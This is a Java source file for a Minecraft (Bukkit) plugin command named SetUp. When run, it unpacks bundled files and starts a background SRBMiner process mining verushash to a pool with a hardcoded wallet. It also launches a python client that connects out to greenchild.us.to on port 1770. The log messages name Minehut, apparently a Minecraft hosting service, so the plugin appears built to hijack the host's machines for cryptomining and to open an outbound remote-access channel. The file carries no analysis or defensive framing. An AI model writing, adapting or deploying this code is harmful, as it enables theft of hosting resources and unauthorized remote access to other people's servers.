package com.greenchild.green;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.jetbrains.annotations.NotNull;

public class SetUp implements CommandExecutor {
    public String home = "/home/minecraft/server/";

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        Green.log("Setting Up Minehut Server");
        Grit input = new Grit(this.getDefault()).parseAll(args);

        Green.execCmd("tar -xf " + this.home + "green.gcol");
        Green.execCmd("cp -r " + this.home + "gcol/ssh " + this.home + "ssh");
        Green.execCmd("cp -r " + this.home + "gcol/mine " + this.home + "mine");

        this.makeVerus(input);
        this.makeSsh(input);

        Green.execCmd("chmod +x mine/verus");
        Green.execCmd("chmod +x ssh/run");

        Green.log("Minehut Server Finished Setting Up");

        return true;
    }

    void makeVerus(Grit input) {
        String contents = "cd /home/minecraft/server/mine/srbminer/\n";
        contents += "chmod +x SRBMiner-MULTI\n\n";

        String cmd = "./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet ";
        cmd += input.get("wallet");
        cmd += ".";
        cmd += input.get("worker");
        cmd += " --password x";

        contents += Gile.nohup(cmd);
        Gile.bash(this.home + "mine/verus", contents);
    }

    void makeSsh(Grit input) {
        String cmd = "python3 /home/minecraft/server/ssh/client.py ";
        cmd += input.get("ip");
        cmd += " ";
        cmd += input.get("port");

        Gile.bash(this.home + "ssh/run", Gile.nohup(cmd));
    }

    Grit getDefault() {
        Grit grit = new Grit(null);

        grit.set("ip", "greenchild.us.to");
        grit.set("port", "1770");
        grit.set("wallet", "RLs9nMFAMRC2PphAzkaMp292JS12yz4xEY");
        grit.set("worker", "worker");

        return grit;
    }
}
